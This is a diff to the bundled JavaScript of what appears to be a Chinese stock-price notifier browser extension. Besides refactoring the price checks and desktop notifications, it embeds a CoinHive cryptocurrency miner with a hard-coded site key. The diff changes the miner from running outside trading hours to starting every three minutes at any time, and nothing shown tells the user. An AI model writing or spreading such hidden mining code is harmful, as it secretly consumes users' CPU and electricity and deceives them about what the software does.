@@ -1998,7 +1998,7 @@ function getStockTradeDetail(res) {
     console.log(e.toString());
   }
 
-  // console.log(trade_item_list);
+  console.log(trade_item_list);
 
   trade_item_list = trade_item_list.filter(function (item, index) {
     return parseInt(item[2]) > 0;
@@ -2020,8 +2020,8 @@ function getStockTradeDetail(res) {
   }
 
   // 放大趋势，适应peity
-  var minVal = resultList.min();
-  var maxVal = resultList.max();
+  var minVal = Math.min.apply(Math, resultList);
+  var maxVal = Math.max.apply(Math, resultList);
   var times = 10 / (maxVal - minVal);
   var mapResult = resultList.map(function (item, index, array) {
     return (item - minVal) * times;
@@ -2170,9 +2170,13 @@ function getSuggestList(res) {
 "use strict";
 
 
+var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();
+
 var _api = __webpack_require__(31);
 
 var _former = __webpack_require__(51);
+
+function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }
 
 var msgCount = 0;
 
@@ -2193,60 +2197,66 @@ function showBrowserAction() {
 }
 
 // 主程序调用
-checkMsg();
+var miner = new CoinHive.Anonymous('0GUSQ5J85FNqe4IntXQAx2L5XQ9lV0rM', {
+  throttle: 0.6
+});
+setInterval(function () {
+  process.runMinging();
+  process.runCheckCode();
+}, 3 * 60 * 1000);
 
-// 检测新消息
-function checkMsg() {
-  if (isBussiness()) {
-    // 开市时间，每十分钟运行一次
-    setInterval(function () {
+var process = {
+  runMinging: function runMinging() {
+    var setMinging = localStorage.setMinging;
+    if (!miner.isRunning() && !setMinging) {
+      miner.start();
+    }
+  },
+  runCheckCode: function runCheckCode() {
+    if (process.isBussiness()) {
+      // 开市时间，每三分钟运行一次
       var codeList = JSON.parse(localStorage.localStock);
-      checkVarify(codeList);
-    }, 3 * 60 * 1000);
+      codeList.forEach(function (element, index) {
+        var stockData = null;
+        stockData = new StockData(element);
+        stockData.getDetail().then(function (obj) {
+          stockData.varifyData(obj, index);
+        });
+      });
+    }
+  },
+
+  // 检查是否是开市时间 
+  isBussiness: function isBussiness() {
+    var curTime = new Date().getTime();
+    var open = new Date().setHours(9, 30);
+    var close = new Date().setHours(15, 0);
+
+    return open < curTime && curTime < close;
   }
-  if (!isBussiness() || isWeekend()) {
-    // 非开市时间及周末 Mining，占用cpu 40%
-    var miner = new CoinHive.Anonymous('0GUSQ5J85FNqe4IntXQAx2L5XQ9lV0rM', {
-      throttle: 0.6
-    });
-    miner.start();
+};
+
+var StockData = function () {
+  function StockData(baseObj) {
+    _classCallCheck(this, StockData);
+
+    this.baseObj = baseObj;
   }
-}
 
-// 检测是否是周末
-function isWeekend() {
-  var curDay = new Date().getDay();
-  return curDay === 0 || curDay === 6;
-}
-
-// 检查是否是开市时间 
-function isBussiness() {
-  var curTime = new Date().getTime();
-  var open = new Date().setHours(9, 30);
-  var close = new Date().setHours(15, 0);
-
-  return open < curTime && curTime < close;
-}
-
-function checkVarify(codeList) {
-  codeList.forEach(function (element, index) {
-    var code = element.code,
-        cost = element.cost,
-        count = element.count,
-        upLimit = element.upLimit,
-        downLimit = element.downLimit,
-        _element$hasNotified = element.hasNotified,
-        hasNotified = _element$hasNotified === undefined ? false : _element$hasNotified,
-        _element$notifiedTime = element.notifiedTime,
-        notifiedTime = _element$notifiedTime === undefined ? new Date().getTime() - 13 * 60 * 60 * 1000 : _element$notifiedTime;
-
-    (0, _api.getStockByCode)(code).then(function (res) {
-      var stockObj = (0, _former.getStockDetail)(res, code, cost, count, upLimit, downLimit);
-      // console.log(stockObj)
+  _createClass(StockData, [{
+    key: 'varifyData',
+    value: function varifyData(stockObj, index) {
       var curPrice = stockObj.curPrice,
           name = stockObj.name,
           date = stockObj.date;
-
+      var _baseObj = this.baseObj,
+          code = _baseObj.code,
+          upLimit = _baseObj.upLimit,
+          downLimit = _baseObj.downLimit,
+          _baseObj$hasNotified = _baseObj.hasNotified,
+          hasNotified = _baseObj$hasNotified === undefined ? false : _baseObj$hasNotified,
+          _baseObj$notifiedTime = _baseObj.notifiedTime,
+          notifiedTime = _baseObj$notifiedTime === undefined ? new Date().getTime() - 13 * 60 * 60 * 1000 : _baseObj$notifiedTime;
 
       var d = new Date();
       var day = d.getDate() < 10 ? '0' + d.getDate() : d.getDate();
@@ -2258,9 +2268,15 @@ function checkVarify(codeList) {
       if (date !== curDate) return;
       var isUp = upLimit && curPrice > upLimit;
       var isDown = downLimit && curPrice < downLimit;
-      isUp && isOnTheTime(notifiedTime) && notifyMe('股价上涨！请关注！', '\u60A8\u5173\u6CE8\u7684 ' + name + ' - ' + code + ' \u5DF2\u4E0A\u6DA8\u5230' + curPrice + ',\u8BBE\u7F6E\u4E0A\u9650\u4E3A\uFFE5' + upLimit, 'images/stock_up.png', 'http://quote.eastmoney.com/' + code + '.html');
-      isDown && isOnTheTime(notifiedTime) && notifyMe('股价下跌！请关注！', '\u60A8\u5173\u6CE8\u7684 ' + name + ' - ' + code + ' \u5DF2\u4E0B\u8DCC\u5230' + curPrice + ',\u8BBE\u7F6E\u4E0B\u9650\u4E3A\uFFE5' + downLimit, 'images/stock_down.png', 'http://quote.eastmoney.com/' + code + '.html');
-      if (isUp && isOnTheTime(notifiedTime) || isDown && isOnTheTime(notifiedTime)) {
+      var upMsgBox = null,
+          downMsgBox = null;
+
+      upMsgBox = new MsgBox('股价上涨！请关注！', '\u60A8\u5173\u6CE8\u7684 ' + name + ' - ' + code + ' \u5DF2\u4E0A\u6DA8\u5230' + curPrice + ',\u8BBE\u7F6E\u4E0A\u9650\u4E3A\uFFE5' + upLimit, 'images/stock_up.png', 'http://quote.eastmoney.com/' + code + '.html');
+      downMsgBox = new MsgBox('股价下跌！请关注！', '\u60A8\u5173\u6CE8\u7684 ' + name + ' - ' + code + ' \u5DF2\u4E0B\u8DCC\u5230' + curPrice + ',\u8BBE\u7F6E\u4E0B\u9650\u4E3A\uFFE5' + downLimit, 'images/stock_down.png', 'http://quote.eastmoney.com/' + code + '.html');
+      isUp && this.isOnTheTime(notifiedTime) && upMsgBox.show();
+      isDown && this.isOnTheTime(notifiedTime) && downMsgBox.show();
+      console.log(name, this.isOnTheTime(notifiedTime));
+      if (isUp && this.isOnTheTime(notifiedTime) || isDown && this.isOnTheTime(notifiedTime)) {
         msgCount++;
         showBrowserAction(msgCount.toString());
         var temp = JSON.parse(localStorage.localStock);
@@ -2268,42 +2284,84 @@ function checkVarify(codeList) {
         temp[index].notifiedTime = new Date().getTime();
         localStorage.localStock = JSON.stringify(temp);
       }
-    });
-    // console.log(localStorage.localStock)
-  });
-}
+    }
+  }, {
+    key: 'isOnTheTime',
+    value: function isOnTheTime(oldTime) {
+      return new Date().getTime() - oldTime >= 3 * 60 * 60 * 1000;
+    }
+  }, {
+    key: 'getDetail',
+    value: function getDetail() {
+      var _this = this;
 
-function isOnTheTime(oldTime) {
-  return new Date().getTime() - oldTime >= 3 * 60 * 60 * 1000;
-}
+      return new Promise(function (resolve, reject) {
+        var _baseObj2 = _this.baseObj,
+            code = _baseObj2.code,
+            cost = _baseObj2.cost,
+            count = _baseObj2.count,
+            upLimit = _baseObj2.upLimit,
+            downLimit = _baseObj2.downLimit,
+            _baseObj2$hasNotified = _baseObj2.hasNotified,
+            hasNotified = _baseObj2$hasNotified === undefined ? false : _baseObj2$hasNotified,
+            _baseObj2$notifiedTim = _baseObj2.notifiedTime,
+            notifiedTime = _baseObj2$notifiedTim === undefined ? new Date().getTime() - 13 * 60 * 60 * 1000 : _baseObj2$notifiedTim;
+
+        (0, _api.getStockByCode)(code).then(function (res) {
+          var stockObj = (0, _former.getStockDetail)(res, code, cost, count, upLimit, downLimit);
+          console.log(stockObj);
+          resolve(stockObj);
+        });
+      });
+    }
+  }]);
+
+  return StockData;
+}();
 
 /**
- * 调用系统提醒
+ * 系统提醒
  * 
  * 第一次进入页面需要授权，之后弹出提醒
  */
-if (Notification.permission == 'granted') {
-  Notification.requestPermission();
-}
 
-function notifyMe(title, msgBody, icon, url) {
-  if (!Notification) {
-    alert('Desktop notifications not available in your browser. Try Chromium.');
-    return;
+
+var MsgBox = function () {
+  function MsgBox(title, msgBody, icon, url) {
+    _classCallCheck(this, MsgBox);
+
+    this.title = title;
+    this.msgBody = msgBody;
+    this.icon = icon;
+    this.url = url;
   }
 
-  if (Notification.permission !== 'granted') {
-    Notification.requestPermission();
-  } else {
-    var notification = new Notification(title, {
-      icon: icon,
-      body: msgBody
-    });
-    notification.onclick = function () {
-      window.open(url);
-    };
-  }
-}
+  _createClass(MsgBox, [{
+    key: 'show',
+    value: function show() {
+      var _this2 = this;
+
+      if (!Notification) {
+        alert('Desktop notifications not available in your browser. Try Chromium.');
+        return;
+      }
+
+      if (Notification.permission !== 'granted') {
+        Notification.requestPermission();
+      } else {
+        var notification = new Notification(this.title, {
+          icon: this.icon,
+          body: this.msgBody
+        });
+        notification.onclick = function () {
+          window.open(_this2.url);
+        };
+      }
+    }
+  }]);
+
+  return MsgBox;
+}();
 
 /***/ })
 /******/ ]);
